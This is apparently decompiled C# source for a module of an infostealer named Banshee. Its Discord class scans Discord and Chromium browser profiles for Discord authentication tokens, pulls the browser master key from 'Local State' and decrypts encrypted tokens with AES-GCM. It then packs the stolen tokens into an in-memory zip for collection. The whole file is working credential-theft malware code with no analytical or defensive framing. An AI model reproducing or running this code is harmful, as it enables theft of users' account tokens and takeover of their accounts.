﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Banshee.Helper.Data;
using Banshee.Helper.Encrypted;

namespace Banshee.Targets.Messangers
{
	// Token: 0x0200003B RID: 59
	public class Discord : ITarget
	{
		// Token: 0x0600007B RID: 123 RVA: 0x00004B18 File Offset: 0x00004B18
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Discord";
			counterApplications.Files.Add("Discord\\");
			Task task = Task.Run(delegate()
			{
				Parallel.ForEach<string>(Paths.Discord, delegate(string path)
				{
					string text = path + "\\Local Storage\\leveldb";
					if (Directory.Exists(text))
					{
						string localstate = path + "\\Local State";
						List<string> list = this.TokensGrabber(text, localstate);
						if (list.Any<string>())
						{
							string browserName = Paths.GetBrowserName(path);
							string text2 = "Discord\\" + browserName + ".txt";
							counterApplications.Files.Add(path + " => " + text2);
							zip.AddTextFile(ZipPath.Messengers(text2), string.Join("\n", list));
						}
					}
				});
			});
			Task task2 = Task.Run(delegate()
			{
				Parallel.ForEach<string>(Paths.Chromium, delegate(string path)
				{
					if (Directory.Exists(path))
					{
						Parallel.ForEach<string>(Directory.GetDirectories(path), delegate(string profile)
						{
							string text = profile + "\\Local Storage\\leveldb";
							if (Directory.Exists(text))
							{
								string localstate = path + "\\Local State";
								List<string> list = this.TokensGrabber(text, localstate);
								if (list.Any<string>())
								{
									string browserName = Paths.GetBrowserName(path);
									string text2 = string.Concat(new string[]
									{
										"Discord\\",
										browserName,
										" ",
										Path.GetFileName(profile),
										".txt"
									});
									counterApplications.Files.Add(path + " => " + text2);
									zip.AddTextFile(ZipPath.Messengers(text2), string.Join("\n", list));
								}
							}
						});
					}
				});
			});
			Task.WaitAll(new Task[]
			{
				task,
				task2
			});
			if (counterApplications.Files.Count<string>() > 0)
			{
				counter.Messangers.Add(counterApplications);
			}
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00004BC4 File Offset: 0x00004BC4
		private List<string> TokensGrabber(string localstorage, string localstate)
		{
			IEnumerable<string> source = this.SearchFiles(localstorage);
			ConcurrentBag<string> tokens = new ConcurrentBag<string>();
			ConcurrentBag<string> tokensEncrypted = new ConcurrentBag<string>();
			Parallel.ForEach<string>(source, delegate(string localdb)
			{
				try
				{
					string content = File.ReadAllText(localdb);
					Parallel.ForEach<string>(this.SearchToken(content), delegate(string token)
					{
						tokens.Add(token);
					});
					Parallel.ForEach<string>(this.SearchEncryptedTokens(content), delegate(string token)
					{
						tokensEncrypted.Add(token);
					});
				}
				catch
				{
				}
			});
			ConcurrentBag<string> distinctTokens = new ConcurrentBag<string>(tokens.Distinct<string>());
			if (!tokensEncrypted.Any<string>())
			{
				return distinctTokens.Distinct<string>().ToList<string>();
			}
			byte[] key = LocalState.MasterKeyV10(localstate);
			if (key == null)
			{
				return distinctTokens.Distinct<string>().ToList<string>();
			}
			Parallel.ForEach<string>(tokensEncrypted.Distinct<string>(), delegate(string encrypted)
			{
				try
				{
					byte[] array = AesGcm.DecryptBrowser(Convert.FromBase64String(encrypted), key, null, false);
					if (array != null)
					{
						distinctTokens.Add(Encoding.UTF8.GetString(array).Trim());
					}
				}
				catch
				{
				}
			});
			return distinctTokens.Distinct<string>().ToList<string>();
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00004C94 File Offset: 0x00004C94
		private List<string> SearchFiles(string path)
		{
			ConcurrentBag<string> locals = new ConcurrentBag<string>();
			string[] allowedExtensions = new string[]
			{
				".log",
				".ldb",
				".sqlite"
			};
			Parallel.ForEach<string>(Directory.GetFiles(path), delegate(string file)
			{
				if (allowedExtensions.Contains(Path.GetExtension(file)))
				{
					locals.Add(file);
				}
			});
			return locals.ToList<string>();
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00004CFC File Offset: 0x00004CFC
		private List<string> ExtractMatches(string content, Regex regex)
		{
			HashSet<string> hashSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
			foreach (object obj in regex.Matches(content))
			{
				string value = ((Match)obj).Groups[1].Value;
				if (!string.IsNullOrWhiteSpace(value))
				{
					hashSet.Add(value);
				}
			}
			return hashSet.ToList<string>();
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00004D80 File Offset: 0x00004D80
		private List<string> SearchToken(string content)
		{
			return this.ExtractMatches(content, Discord._tokenRegex);
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00004D8E File Offset: 0x00004D8E
		private List<string> SearchEncryptedTokens(string content)
		{
			return this.ExtractMatches(content, Discord._encryptedRegex);
		}

		// Token: 0x04000074 RID: 116
		private static readonly Regex _tokenRegex = new Regex("(mfa\\.[\\w-]{80,})|((MT|OD)[\\w-]{22,24}\\.[\\w-]{6}\\.[\\w-]{25,110})", RegexOptions.IgnoreCase | RegexOptions.Compiled);

		// Token: 0x04000075 RID: 117
		private static readonly Regex _encryptedRegex = new Regex("\"dQw4w9WgXcQ:([^\"]+)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled);
	}
}
